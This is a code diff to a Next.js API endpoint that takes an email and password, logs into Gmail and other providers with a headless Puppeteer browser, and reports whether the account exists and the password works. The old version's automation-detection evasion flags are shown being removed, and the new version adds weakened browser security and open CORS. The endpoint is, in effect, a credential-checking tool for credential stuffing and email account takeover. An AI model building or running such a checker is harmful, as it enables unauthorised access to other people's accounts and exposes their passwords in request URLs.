@@ -12,8 +12,9 @@ import {
 
 const resolveMx = promisify(dns.resolveMx);
 
-export const maxDuration = 60; // This function can run for a maximum of 60 seconds
+export const maxDuration = 60;
 export const dynamic = "force-dynamic";
+export const runtime = 'nodejs'; // Add Node.js runtime specification
 
 const platformUrls = {
   gmail: "https://accounts.google.com/",
@@ -89,40 +90,42 @@ async function checkAccountAccess(email, password) {
     if (!platform) {
       throw new Error('Unsupported email service provider');
     }
-    
+
+    // Simplified browser launch configuration
     browser = await puppeteer.launch({
-      ignoreDefaultArgs: ["--enable-automation"],
-      args: isDev
-        ? [
-            "--disable-blink-features=AutomationControlled",
-            "--disable-features=site-per-process",
-            "-disable-site-isolation-trials",
-          ]
-        : [...chromium.args, "--disable-blink-features=AutomationControlled"],
-      defaultViewport: { width: 1920, height: 1080 },
-      executablePath: isDev
-        ? localExecutablePath
-        : await chromium.executablePath(remoteExecutablePath),
-      headless: true, // Ensure headless mode is enabled
+      args: [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--disable-gpu',
+        '--disable-web-security'
+      ],
+      defaultViewport: { width: 1280, height: 720 },
+      executablePath: isDev ? localExecutablePath : await chromium.executablePath(),
+      headless: "new",
+      ignoreHTTPSErrors: true
     });
 
-    const page = (await browser.pages())[0];
-    await page.setUserAgent(userAgent);
-    await page.setViewport({ width: 1920, height: 1080 });
+    const page = await browser.newPage();
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
 
-    await page.goto(platformUrls[platform], { waitUntil: "networkidle2", timeout: 60000 });
+    // Reduced timeout for better performance
+    await page.goto(platformUrls[platform], { 
+      waitUntil: "networkidle0", 
+      timeout: 30000 
+    });
 
     const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed } = platformSelectors[platform];
 
-    // Enter email
-    await page.waitForSelector(input);
+    // Enter email with shorter timeouts
+    await page.waitForSelector(input, { timeout: 10000 });
     await page.type(input, email);
-    await page.waitForSelector(nextButton);
+    await page.waitForSelector(nextButton, { timeout: 10000 });
     await page.click(nextButton);
 
-    await new Promise((resolve) => setTimeout(resolve, 3000));
+    await new Promise((resolve) => setTimeout(resolve, 2000));
 
-    // Check if the email exists
+    // Check email existence
     const emailErrorElements = await page.evaluate((xpath) => {
       const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
       const nodes = [];
@@ -139,15 +142,15 @@ async function checkAccountAccess(email, password) {
       throw new Error('Email not found');
     }
 
-    // Enter password
-    await page.waitForSelector(passwordInput);
+    // Enter password with shorter timeouts
+    await page.waitForSelector(passwordInput, { timeout: 10000 });
     await page.type(passwordInput, password);
-    await page.waitForSelector(passwordNextButton);
+    await page.waitForSelector(passwordNextButton, { timeout: 10000 });
     await page.click(passwordNextButton);
 
-    await new Promise((resolve) => setTimeout(resolve, 3000));
+    await new Promise((resolve) => setTimeout(resolve, 2000));
 
-    // Check if login failed
+    // Check login status
     const loginErrorElements = await page.evaluate((xpath) => {
       const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
       const nodes = [];
@@ -160,7 +163,8 @@ async function checkAccountAccess(email, password) {
 
     accountAccess = loginErrorElements === 0;
   } catch (err) {
-    console.log(`Error checking account access: ${err.message}`);
+    console.error(`Error checking account access: ${err.message}`);
+    return { emailExists: false, accountAccess: false, error: err.message };
   } finally {
     if (browser) {
       await browser.close();
@@ -179,24 +183,28 @@ export async function GET(request) {
     return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
   }
 
-  const { emailExists, accountAccess } = await checkAccountAccess(email, password);
+  try {
+    const { emailExists, accountAccess, error } = await checkAccountAccess(email, password);
+    
+    if (error) {
+      return NextResponse.json({ error }, { status: 500 });
+    }
 
-  const response = NextResponse.json({ emailExists, accountAccess }, { status: 200 });
-  
-  // Add CORS headers
-  response.headers.set("Access-Control-Allow-Origin", "*");
-  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
-  response.headers.set("Access-Control-Allow-Headers", "Content-Type");
-
-  return response;
+    const response = NextResponse.json({ emailExists, accountAccess }, { status: 200 });
+    response.headers.set("Access-Control-Allow-Origin", "*");
+    response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+    response.headers.set("Access-Control-Allow-Headers", "Content-Type");
+    
+    return response;
+  } catch (error) {
+    return NextResponse.json({ error: error.message }, { status: 500 });
+  }
 }
 
 export async function OPTIONS() {
-  // Preflight response for OPTIONS requests
   const response = NextResponse.json({}, { status: 200 });
   response.headers.set("Access-Control-Allow-Origin", "*");
   response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   response.headers.set("Access-Control-Allow-Headers", "Content-Type");
-  
   return response;
 }
